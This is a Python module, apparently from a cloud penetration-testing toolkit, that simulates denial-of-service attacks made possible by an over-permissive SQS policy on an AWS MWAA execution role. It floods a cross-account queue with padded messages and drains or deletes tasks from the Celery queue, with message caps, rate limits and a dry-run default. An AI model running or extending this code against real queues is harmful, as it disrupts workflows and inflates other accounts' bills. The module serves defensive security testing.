"""
Module 3: Denial of Service (DoS) Simulation Testing

Tests two DoS attack vectors enabled by the MWAA execution role SQS policy:

1. Internal Service Disruption: Consuming/deleting messages from the MWAA
   internal Celery queue to starve workers of tasks.
2. Cross-Account Billing DoS: Flooding a target queue in another account
   with messages to trigger expensive downstream processing.

SAFETY: This module includes rate-limiting and message caps to prevent
actual damage during testing. All tests are non-destructive by default.
"""

import json
import time
from typing import Optional

from ..config import AttackerConfig, REQUIRED_QUEUE_PREFIX
from ..utils import (
    get_sqs_client,
    create_test_queue,
    set_queue_policy_allow_cross_account,
    delete_test_queue,
    send_message,
    receive_messages,
    print_section,
    print_success,
    print_fail,
    print_info,
    print_warn,
    print_result,
    logger,
)

# Safety limits
DEFAULT_MESSAGE_CAP = 100
DEFAULT_RATE_LIMIT_PER_SEC = 10


def test_message_flood(
    attacker: AttackerConfig,
    target_queue_url: Optional[str] = None,
    queue_name: str = "airflow-celery-dos-test",
    message_count: int = DEFAULT_MESSAGE_CAP,
    rate_limit: int = DEFAULT_RATE_LIMIT_PER_SEC,
    source_profile: Optional[str] = None,
    source_region: Optional[str] = None,
) -> dict:
    """
    Test cross-account message flooding capability.

    If target_queue_url is not provided, creates a test queue in the
    attacker's account first to safely demonstrate the capability.
    """
    print_section("DoS Simulation: Message Flood Test")

    own_queue = False
    if not target_queue_url:
        print_info("No target queue specified. Creating a test queue in attacker account.")
        sqs_attacker = get_sqs_client(attacker.region, attacker.profile)
        target_queue_url = create_test_queue(sqs_attacker, queue_name)
        attrs = sqs_attacker.get_queue_attributes(
            QueueUrl=target_queue_url, AttributeNames=["QueueArn"]
        )
        set_queue_policy_allow_cross_account(sqs_attacker, target_queue_url, attrs["Attributes"]["QueueArn"])
        own_queue = True

    # Use source credentials to simulate the MWAA execution role
    sender_sqs = get_sqs_client(
        source_region or attacker.region,
        source_profile,
    )

    print_info(f"Target queue: {target_queue_url}")
    print_info(f"Message count: {message_count} (cap for safety)")
    print_info(f"Rate limit: {rate_limit} msg/sec")
    print_warn("This is a CONTROLLED test. Real DoS would send millions of messages.")

    sent = 0
    errors = 0
    start_time = time.time()

    for i in range(message_count):
        payload = {
            "type": "dos_test",
            "sequence": i,
            "timestamp": time.time(),
            "padding": "X" * 1024,  # ~1KB per message
        }
        try:
            send_message(sender_sqs, target_queue_url, json.dumps(payload))
            sent += 1
        except Exception as e:
            errors += 1
            error_code = getattr(e, "response", {}).get("Error", {}).get("Code", "")
            if error_code == "AccessDenied":
                print_fail(f"Access denied after {sent} messages. Policy may be hardened.")
                break
            logger.debug("Send error: %s", e)

        # Rate limiting
        elapsed = time.time() - start_time
        expected_time = (i + 1) / rate_limit
        if elapsed < expected_time:
            time.sleep(expected_time - elapsed)

        if (i + 1) % 25 == 0:
            print_info(f"Progress: {i + 1}/{message_count} sent")

    elapsed = time.time() - start_time
    rate = sent / elapsed if elapsed > 0 else 0

    print()
    results = {
        "sent": sent,
        "errors": errors,
        "elapsed_seconds": round(elapsed, 2),
        "messages_per_second": round(rate, 1),
        "target_queue": target_queue_url,
    }

    if sent > 0:
        print_success(f"FINDING: Sent {sent} messages in {elapsed:.1f}s ({rate:.1f} msg/s)")
        print_warn("Cross-account SQS flooding is possible via the MWAA execution role.")
        print_warn("At scale, this could cause significant billing impact or service disruption.")
    else:
        print_fail("No messages sent. The attack vector may not be exploitable.")

    # Cleanup test queue if we created it
    if own_queue:
        print_info("Cleaning up test queue...")
        sqs_attacker = get_sqs_client(attacker.region, attacker.profile)
        delete_test_queue(sqs_attacker, target_queue_url)

    return results


def test_message_consumption(
    attacker: AttackerConfig,
    target_queue_url: str,
    max_consume: int = 10,
    source_profile: Optional[str] = None,
    source_region: Optional[str] = None,
    dry_run: bool = True,
) -> dict:
    """
    Test the ability to consume (and optionally delete) messages from a queue.

    This simulates the internal DoS where an attacker drains messages from
    the MWAA Celery task queue to starve workers.

    WARNING: With dry_run=False and a real target, this WILL disrupt services.
    """
    print_section("DoS Simulation: Message Consumption Test")

    consumer_sqs = get_sqs_client(
        source_region or attacker.region,
        source_profile,
    )

    print_info(f"Target queue: {target_queue_url}")
    print_info(f"Max messages to consume: {max_consume}")
    print_info(f"Dry run: {dry_run}")
    if dry_run:
        print_warn("DRY RUN: Messages will be received but NOT deleted.")
    else:
        print_warn("LIVE MODE: Messages WILL be deleted from the queue!")

    consumed = 0
    deleted = 0

    while consumed < max_consume:
        batch_size = min(10, max_consume - consumed)
        messages = receive_messages(
            consumer_sqs, target_queue_url,
            max_messages=batch_size,
            wait_seconds=5,
            delete_after=not dry_run,
        )

        if not messages:
            print_info("No more messages available.")
            break

        consumed += len(messages)
        if not dry_run:
            deleted += len(messages)

        for msg in messages:
            body_preview = msg["Body"][:80]
            print_result("Consumed", body_preview)

    results = {
        "consumed": consumed,
        "deleted": deleted,
        "dry_run": dry_run,
        "target_queue": target_queue_url,
    }

    if consumed > 0:
        print_success(f"FINDING: Consumed {consumed} messages from the target queue.")
        if not dry_run:
            print_warn(f"Deleted {deleted} messages. Workers will not receive these tasks.")
        print_warn("An attacker could drain the Celery task queue to halt MWAA workflows.")
    else:
        print_info("No messages consumed (queue may be empty).")

    return results


def assess_dos_risk(
    attacker: AttackerConfig,
    source_profile: Optional[str] = None,
    source_region: Optional[str] = None,
) -> dict:
    """
    Run a safe assessment of DoS capabilities without targeting real resources.

    Creates a temporary queue, tests send/receive/delete, then cleans up.
    """
    print_section("DoS Risk Assessment (Safe Mode)")

    sqs_attacker = get_sqs_client(attacker.region, attacker.profile)
    queue_name = "airflow-celery-dos-assess"

    # Create temp queue
    queue_url = create_test_queue(sqs_attacker, queue_name)
    attrs = sqs_attacker.get_queue_attributes(QueueUrl=queue_url, AttributeNames=["QueueArn"])
    set_queue_policy_allow_cross_account(sqs_attacker, queue_url, attrs["Attributes"]["QueueArn"])

    sender_sqs = get_sqs_client(
        source_region or attacker.region,
        source_profile,
    )

    results = {"send": False, "receive": False, "delete": False}

    # Test SendMessage
    try:
        send_message(sender_sqs, queue_url, json.dumps({"test": "dos_assessment"}))
        results["send"] = True
        print_success("SendMessage: ALLOWED (enables message flooding)")
    except Exception as e:
        print_fail(f"SendMessage: BLOCKED ({e})")

    # Test ReceiveMessage
    try:
        msgs = receive_messages(sender_sqs, queue_url, max_messages=1, wait_seconds=5)
        results["receive"] = bool(msgs)
        if msgs:
            print_success("ReceiveMessage: ALLOWED (enables message draining)")
            receipt = msgs[0]["ReceiptHandle"]
            # Test DeleteMessage
            try:
                sender_sqs.delete_message(QueueUrl=queue_url, ReceiptHandle=receipt)
                results["delete"] = True
                print_success("DeleteMessage: ALLOWED (enables permanent message removal)")
            except Exception as e:
                print_fail(f"DeleteMessage: BLOCKED ({e})")
        else:
            print_info("ReceiveMessage: No messages returned")
    except Exception as e:
        print_fail(f"ReceiveMessage: BLOCKED ({e})")

    # Cleanup
    delete_test_queue(sqs_attacker, queue_url)

    # Summary
    print()
    if all(results.values()):
        print_warn("HIGH RISK: All DoS-relevant SQS actions are permitted.")
        print_warn("  - Message flooding can cause billing impact on target queues")
        print_warn("  - Message consumption can starve MWAA Celery workers")
        print_warn("  - Message deletion makes consumption permanent and unrecoverable")
    elif results["send"]:
        print_warn("MEDIUM RISK: Message flooding is possible but consumption/deletion is blocked.")
    else:
        print_info("LOW RISK: DoS actions appear to be restricted.")

    return results
